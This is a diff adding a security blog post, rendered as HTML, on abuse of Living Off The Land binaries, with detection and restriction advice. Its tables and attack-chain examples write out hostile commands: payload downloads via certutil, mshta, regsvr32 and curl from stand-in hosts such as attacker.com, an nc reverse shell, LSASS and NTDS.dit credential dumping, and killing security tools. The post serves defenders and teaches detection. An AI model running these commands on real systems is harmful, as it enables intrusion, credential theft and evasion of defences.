@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>Living Off The Land Binaries — Attackers Using Your Own Tools Against You — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-tools">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-tools">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">Living Off The Land Binaries — Attackers Using Your Own Tools Against You</h1>
+    <div class="post-meta">
+      <time>2026-06-16</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">1 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/tools/" class="cat-badge cat-badge-link cat-tools">Tools</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">lolbins</span>
+          
+            <span class="tag">red-team</span>
+          
+            <span class="tag">blue-team</span>
+          
+            <span class="tag">windows</span>
+          
+            <span class="tag">evasion</span>
+          
+            <span class="tag">detection</span>
+          
+            <span class="tag">defense-evasion</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">LOLBins are signed Microsoft binaries that attackers weaponise to download, execute, and persist — bypassing application whitelisting and AV. A comprehensive reference table of the most abused LOLBins, what they do, and how to detect and restrict each one.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        <div class="block text-block"><p>Living Off The Land (LOTL) is one of the most effective evasion techniques available to an attacker — and one of the most painful for defenders to address. The concept is simple: instead of dropping custom malware that defenders can signature, use the tools already present on the target system. Microsoft-signed. Trusted by your AV. Allowed by your application whitelist. Running under a legitimate process.</p>
+<p>LOLBins (Living Off the Land Binaries) are a subset of this: Windows binaries already present on most systems that were not designed for malicious use but have been repeatedly abused to download code, execute payloads, bypass controls, or establish persistence.</p>
+<p>The canonical reference is <strong>LOLBAS Project</strong> (lolbas-project.github.io) — this post covers the most operationally significant entries with detection logic for each.</p></div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-info">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+              
+              <span>Why LOLBins work so well</span>
+            </div>
+          
+          <div class="note-body"><p>Most endpoint controls operate on reputation and signature. Microsoft-signed binaries have the highest possible reputation. Application whitelisting (AppLocker, WDAC) typically allows all signed Windows binaries by default. Behavioural detections must be explicitly tuned to catch legitimate tools being misused — a much harder problem than catching known-malicious files.</p></div>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">01</span>
+            <span class="heading-text">Windows LOLBins — Execution &amp; Download</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Binary</th><th>Location</th><th>Abuse Technique</th><th>Detection Focus</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**certutil.exe**</td><td>`C:\Windows\System32\`</td><td>Download files (`-urlcache -f http://...`), decode base64 (`-decode`), encode (`-encode`), calculate file hash — frequently used as first-stage downloader</td><td>Alert on: certutil with `-urlcache`, `-decode`, or `-encode` flags. Child processes of certutil are almost always malicious</td>
+                </tr>
+              
+                <tr>
+                  <td>**mshta.exe**</td><td>`C:\Windows\System32\`</td><td>Execute HTA (HTML Application) files from URL: `mshta.exe http://evil.com/payload.hta`. HTA runs JScript/VBScript with full COM access, bypasses most script restrictions</td><td>Alert on: mshta.exe with http:// or https:// arguments. mshta spawning cmd.exe, powershell.exe, or wscript.exe</td>
+                </tr>
+              
+                <tr>
+                  <td>**regsvr32.exe**</td><td>`C:\Windows\System32\`</td><td>`regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll` — &#39;Squiblydoo&#39; loads remote scriptlet, executes arbitrary COM object, bypasses AppLocker</td><td>Alert on: regsvr32 with `/i:http` argument, or registering DLLs from temp directories</td>
+                </tr>
+              
+                <tr>
+                  <td>**rundll32.exe**</td><td>`C:\Windows\System32\`</td><td>Execute arbitrary DLL exports: `rundll32.exe evil.dll,EntryPoint`. Also abused to load JavaScript via `rundll32 javascript:...` and run MSI files</td><td>Alert on: rundll32 loading DLLs from user-writable locations (AppData, Temp, Downloads). rundll32 with javascript: in arguments</td>
+                </tr>
+              
+                <tr>
+                  <td>**msiexec.exe**</td><td>`C:\Windows\System32\`</td><td>Install remote MSI: `msiexec /q /i http://evil.com/payload.msi`. MSI packages can execute arbitrary code; this downloads and runs silently</td><td>Alert on: msiexec with `/i http://` or `/i https://` arguments, or installing from temp paths</td>
+                </tr>
+              
+                <tr>
+                  <td>**bitsadmin.exe**</td><td>`C:\Windows\System32\`</td><td>Background download of arbitrary files: `bitsadmin /transfer job /download /priority high http://evil.com/file.exe C:\Users\evil.exe`. Legacy but still works</td><td>Alert on: bitsadmin creating transfer jobs pointing to external URLs and writing to user-writable paths</td>
+                </tr>
+              
+                <tr>
+                  <td>**wmic.exe**</td><td>`C:\Windows\System32\wbem\`</td><td>Process creation: `wmic process call create calc.exe`. Lateral movement via `/node:TARGET`. Spawn processes that inherit parent (wmiprvse.exe) — breaks many detection chains</td><td>Alert on: wmic.exe with `process call create` and suspicious commands. wmiprvse.exe spawning shells or network tools</td>
+                </tr>
+              
+                <tr>
+                  <td>**cmstp.exe**</td><td>`C:\Windows\System32\`</td><td>Install connection manager profiles from INF files: loads malicious DLL specified in INF. Also bypasses UAC on some Windows versions</td><td>Alert on: cmstp.exe with `/s /ns` flags or referencing INF files from non-standard locations</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">02</span>
+            <span class="heading-text">Windows LOLBins — Scripting &amp; Persistence</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Binary</th><th>Location</th><th>Abuse Technique</th><th>Detection Focus</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**wscript.exe / cscript.exe**</td><td>`C:\Windows\System32\`</td><td>Execute VBScript or JScript: `wscript.exe malware.vbs`. Frequently used in email attachment chains. cscript is the console version</td><td>Alert on: wscript/cscript executing scripts from Temp, AppData, Downloads, or directly from email attachment directories</td>
+                </tr>
+              
+                <tr>
+                  <td>**powershell.exe**</td><td>`C:\Windows\System32\`</td><td>Encoded commands (`-enc`), download-cradles (`IEX (iwr ...)`), AMSI bypass, constrained language mode bypass, fileless payload execution</td><td>Enable ScriptBlock Logging (EID 4104). Alert on: `-enc` flag, `IEX`, `DownloadString`, `-NonInteractive -WindowStyle Hidden` combination</td>
+                </tr>
+              
+                <tr>
+                  <td>**pwsh.exe**</td><td>`C:\Program Files\PowerShell\7\`</td><td>PowerShell 7 (cross-platform). May have fewer event logging hooks than Windows PowerShell — attackers use it to avoid EID 4103/4104 on older configs</td><td>Ensure ScriptBlock Logging is configured for PowerShell 7 separately from Windows PowerShell. Monitor pwsh.exe process creation same as powershell.exe</td>
+                </tr>
+              
+                <tr>
+                  <td>**schtasks.exe**</td><td>`C:\Windows\System32\`</td><td>Persistence: `schtasks /create /tn &#39;Update&#39; /tr &#39;cmd /c evil.exe&#39; /sc ONLOGON`. Lateral movement: `/s TARGET` to schedule tasks remotely</td><td>Alert on: schtasks /create pointing to user-writable paths. Windows Event 4698 (task created) especially during off-hours. Remote task creation (4698 on remote host)</td>
+                </tr>
+              
+                <tr>
+                  <td>**at.exe**</td><td>`C:\Windows\System32\`</td><td>Legacy scheduler (deprecated) — still present on many systems. Remote execution: `at \\TARGET 12:00 cmd.exe`</td><td>Alert on any at.exe usage — it has no legitimate modern use case. Windows Event 4698 covers both at.exe and schtasks.exe</td>
+                </tr>
+              
+                <tr>
+                  <td>**reg.exe**</td><td>`C:\Windows\System32\`</td><td>Registry persistence: `reg add HKCU\...\Run /v Updater /d evil.exe`. Export credential hive: `reg save HKLM\SYSTEM system.hiv`</td><td>Alert on: reg add to Run/RunOnce keys. `reg save` or `reg export` of SAM, SECURITY, or SYSTEM hives — credential theft indicator</td>
+                </tr>
+              
+                <tr>
+                  <td>**sc.exe**</td><td>`C:\Windows\System32\`</td><td>Install malicious service: `sc create evilsvc binPath= C:\evil.exe start= auto`. Services run as SYSTEM and persist across reboots</td><td>Alert on: sc.exe create with binPath pointing to user-writable locations. Windows Event 7045 (new service installed)</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">03</span>
+            <span class="heading-text">Windows LOLBins — Credential Access &amp; Recon</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Binary</th><th>Location</th><th>Abuse Technique</th><th>Detection Focus</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**ntdsutil.exe**</td><td>`C:\Windows\System32\`</td><td>AD database snapshot: `ntdsutil &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full C:\temp\dump&#39;` — creates an offline copy of NTDS.dit containing all domain password hashes</td><td>Alert on any ntdsutil.exe usage outside documented backup windows. This is almost never used legitimately on workstations. Windows Event 4688 + command line</td>
+                </tr>
+              
+                <tr>
+                  <td>**vssadmin.exe**</td><td>`C:\Windows\System32\`</td><td>Volume Shadow Copy for credential theft: `vssadmin create shadow` then copy NTDS.dit from shadow. Also used by ransomware: `vssadmin delete shadows /all`</td><td>Alert on: vssadmin create/delete shadows. Any process accessing NTDS.dit via VSS path. Ransomware typically chains vssadmin delete with encryption immediately after</td>
+                </tr>
+              
+                <tr>
+                  <td>**net.exe / net1.exe**</td><td>`C:\Windows\System32\`</td><td>Reconnaissance: `net user`, `net localgroup administrators`, `net view`, `net share`. Lateral movement: `net use \\TARGET\c$ /user:admin pass`</td><td>Alert on: net commands executed by non-admin users, net commands run from unusual parent processes (PowerShell, mshta, wscript). High frequency indicates automated recon</td>
+                </tr>
+              
+                <tr>
+                  <td>**tasklist.exe / taskkill.exe**</td><td>`C:\Windows\System32\`</td><td>Process enumeration (recon), kill security tools: `taskkill /f /im mbam.exe`</td><td>Alert on: taskkill targeting known security products (MBAMService, SentinelAgent, CrowdStrike*, CarbonBlack*)</td>
+                </tr>
+              
+                <tr>
+                  <td>**procdump.exe** (Sysinternals)</td><td>Downloaded — not built-in</td><td>LSASS dump: `procdump -ma lsass.exe lsass.dmp` — signed Microsoft tool, often whitelisted. Dumps process memory containing credentials</td><td>Alert on: procdump targeting lsass.exe. Windows Event 10 (Sysmon process access) with lsass.exe as target. Also block with Windows Defender Credential Guard</td>
+                </tr>
+              
+                <tr>
+                  <td>**whoami.exe / ipconfig.exe / systeminfo.exe**</td><td>`C:\Windows\System32\`</td><td>Post-exploitation recon in sequence: attackers run all three within seconds — automated recon checklist artefact</td><td>Alert on: whoami + systeminfo + ipconfig executed within 60 seconds from the same process lineage. This pattern = almost certain intrusion</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">04</span>
+            <span class="heading-text">Linux LOLBins</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Binary</th><th>Abuse Technique</th><th>Detection Focus</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**curl / wget**</td><td>Download and execute: `curl http://evil.com/payload | bash`. Attacker favourite for initial stager delivery</td><td>Alert on: curl/wget output piped to bash/sh. Output to /tmp or /dev/shm. Running with `-s` (silent) flag from unusual parents</td>
+                </tr>
+              
+                <tr>
+                  <td>**python3 / perl / ruby**</td><td>Inline reverse shells: `python3 -c &#39;import os,pty;os.dup2(s.fileno(),0);pty.spawn(&#34;/bin/sh&#34;)&#39;`. Execute remote code with `-c` or `-e` flags</td><td>Alert on: interpreter invoked with `-c` containing socket/exec/pty content. Network connections from python3/perl/ruby processes</td>
+                </tr>
+              
+                <tr>
+                  <td>**nc / ncat / socat**</td><td>Reverse shell: `nc -e /bin/sh attacker.com 4444`. Encrypted tunnel: `socat TCP-L:4444 EXEC:bash`</td><td>Alert on: nc/socat spawning a shell process as child. Network connections from these tools to external IPs especially on high ports</td>
+                </tr>
+              
+                <tr>
+                  <td>**base64**</td><td>Decode obfuscated payloads: `echo &#39;ENCODED&#39; | base64 -d | bash`</td><td>Alert on: base64 output piped to bash/sh/python. Long base64 strings in command arguments (&gt;200 chars likely encoded payload)</td>
+                </tr>
+              
+                <tr>
+                  <td>**find / cp / dd**</td><td>Data exfiltration: copy sensitive files to a staging directory. `find / -name &#39;*.pem&#39; 2&gt;/dev/null` credential hunting</td><td>Alert on: find recursing from / with -name patterns matching credentials (.pem, .key, id_rsa, .env, password, secret). Run from non-admin shells</td>
+                </tr>
+              
+                <tr>
+                  <td>**crontab**</td><td>Persistence: `crontab -e` to add `* * * * * /tmp/beacon`. Or write to `/etc/cron.d/` if root</td><td>Alert on: crontab modifications (auditd rule: -w /var/spool/cron -p wa). New files in /etc/cron.d/ or /etc/cron.hourly/</td>
+                </tr>
+              
+                <tr>
+                  <td>**awk / sed**</td><td>`awk &#39;BEGIN {cmd=&#34;/bin/sh&#34;; print &#34;&#34; | cmd}&#39;` — execute shell from awk. Used to bypass restricted shells</td><td>Alert on: awk/sed spawning shell processes. Restricted shell (rbash) breakout attempts</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">05</span>
+            <span class="heading-text">Attack Examples — Common LOLBin Chains</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Certutil download chain</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">cmd</span>
+            
+          </div>
+          <pre><code class="language-cmd">REM Stage 1: certutil downloads the payload
+certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Users\Public\payload.exe
+
+REM Stage 2: Execute
+C:\Users\Public\payload.exe
+
+REM Variation: base64 decode to bypass content inspection
+certutil.exe -urlcache -split -f http://attacker.com/payload.b64 C:\Users\Public\payload.b64
+certutil.exe -decode C:\Users\Public\payload.b64 C:\Users\Public\payload.exe</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Regsvr32 Squiblydoo</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">cmd</span>
+            
+          </div>
+          <pre><code class="language-cmd">REM Load remote COM scriptlet via scrobj.dll — bypasses AppLocker
+regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll
+
+REM The SCT file is XML containing a JScript/VBScript payload
+REM &lt;scriptlet&gt;&lt;registration progid=&#39;test&#39; classid=&#39;{...}&#39;&gt;
+REM   &lt;script language=&#39;JScript&#39;&gt;
+REM     var r = new ActiveXObject(&#39;WScript.Shell&#39;);
+REM     r.Run(&#39;cmd.exe /c powershell -enc ...&#39;);
+REM   &lt;/script&gt;
+REM &lt;/registration&gt;&lt;/scriptlet&gt;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">WMIC lateral movement</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">cmd</span>
+            
+          </div>
+          <pre><code class="language-cmd">REM Execute process on remote host via WMIC (requires valid credentials)
+wmic /node:10.0.20.11 /user:DOMAIN\admin /password:Password1 \
+  process call create &#34;powershell -enc BASE64PAYLOAD&#34;
+
+REM Why this is hard to detect:
+REM - Uses legitimate credentials
+REM - Process is spawned by wmiprvse.exe on target (looks legitimate)
+REM - WMIC traffic is encrypted over DCE/RPC
+REM - No file written to target (if payload is in-memory)</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">06</span>
+            <span class="heading-text">Detection and Restriction Strategy</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The goal is not to block all LOLBins — many have legitimate uses. The goal is to <strong>contextualise their execution</strong>: who ran it, from what parent process, with what arguments, at what time. Anomaly detection beats signature detection here.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            
+          </div>
+          <pre><code class="language-powershell"># Windows Defender Attack Surface Reduction (ASR) rules — block the most abused patterns
+# Requires Defender ATP / MDE
+
+# Block Office apps from creating child processes
+Add-MpPreference -AttackSurfaceReductionRules_Ids &#39;d4f940ab-401b-4efc-aadc-ad5f3c50688a&#39; -AttackSurfaceReductionRules_Actions Enabled
+
+# Block process creations originating from PSExec and WMI commands
+Add-MpPreference -AttackSurfaceReductionRules_Ids &#39;d1e49aac-8f56-4280-b9ba-993a6d77406c&#39; -AttackSurfaceReductionRules_Actions Enabled
+
+# Block JavaScript or VBScript from launching downloaded executable content
+Add-MpPreference -AttackSurfaceReductionRules_Ids &#39;d3e037e1-3eb8-44c8-a917-57927947596d&#39; -AttackSurfaceReductionRules_Actions Enabled
+
+# Block execution of potentially obfuscated scripts
+Add-MpPreference -AttackSurfaceReductionRules_Ids &#39;5beb7efe-fd9a-4556-801d-275e5ffc04cc&#39; -AttackSurfaceReductionRules_Actions Enabled
+
+# AppLocker: block execution from user-writable paths (allow-list approach)
+# Start with Audit mode — collect events before switching to Enforce
+New-AppLockerPolicy -RuleType Path -User Everyone -Path &#39;%TEMP%\*&#39; -Action Deny</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">yaml</span>
+            
+          </div>
+          <pre><code class="language-yaml"># Sysmon rule: detect certutil used as downloader
+# Add to sysmonconfig.xml EventFiltering section
+
+&lt;RuleGroup name=&#34;certutil_abuse&#34; groupRelation=&#34;or&#34;&gt;
+  &lt;ProcessCreate onmatch=&#34;include&#34;&gt;
+    &lt;Rule name=&#34;CertUtil Downloader&#34; groupRelation=&#34;and&#34;&gt;
+      &lt;Image condition=&#34;end with&#34;&gt;certutil.exe&lt;/Image&gt;
+      &lt;CommandLine condition=&#34;contains any&#34;&gt;-urlcache;-decode;-encode;-verifyctl&lt;/CommandLine&gt;
+    &lt;/Rule&gt;
+  &lt;/ProcessCreate&gt;
+&lt;/RuleGroup&gt;</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-note-block note-tip">
+          
+            <div class="note-label">
+              
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18h6"/><path d="M10 22h4"/><path d="M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.46.45.97 1.36 1.41 2.5"/></svg>
+              
+              <span>Quick wins — restrict the highest-impact LOLBins first</span>
+            </div>
+          
+          <div class="note-body"><p>If you can only restrict a few, prioritise these because they offer the most attacker value with no legitimate daily-use case in most environments:<br>
+1. <strong>cmstp.exe</strong> — disable via AppLocker if your org does not use Connection Manager profiles<br>
+2. <strong>mshta.exe</strong> — block or monitor; almost never needed for business operations<br>
+3. <strong>regsvr32.exe with /i:http</strong> — ASR rule exists specifically for this<br>
+4. <strong>certutil.exe with -urlcache</strong> — block the flag, not the binary (hashing is a legitimate use)<br>
+5. <strong>wscript.exe / cscript.exe from email paths</strong> — block execution from Outlook attachment temp directories</p></div>
+        </div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/red-vs-blue-eternal-game" class="post-card post-card-related card-cat-security">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-security">Security</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Red vs Blue: The Eternal Game</h2>
+          <div class="post-card-meta"><time>2026-06-16</time></div>
+          <p class="post-card-summary">The cat-and-mouse between attackers and defenders has no finish line. A structured breakdown of every major kill-chain phase — attacker technique on the left, defender response on the right — and why purple teaming is the only way to close the loop.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/windows-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Windows Fundamentals — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Architecture, filesystem, registry, users, NTFS permissions, processes, services, PowerShell, Active Directory, event logs, and a red team lens on every layer.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/threat-hunting-sigma-rules" class="post-card post-card-related card-cat-security">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-security">Security</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Threat Hunting with Sigma Rules — Writing Detections That Actually Work</h2>
+          <div class="post-card-meta"><time>2026-06-16</time></div>
+          <p class="post-card-summary">Sigma is the vendor-neutral standard for writing detection rules that compile to any SIEM. Covers the Sigma format in depth, writing rules for real ATT&amp;CK techniques, converting to Splunk/Elastic/QRadar queries, hunting methodologies, and building a detection pipeline that keeps pace with evolving adversaries.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
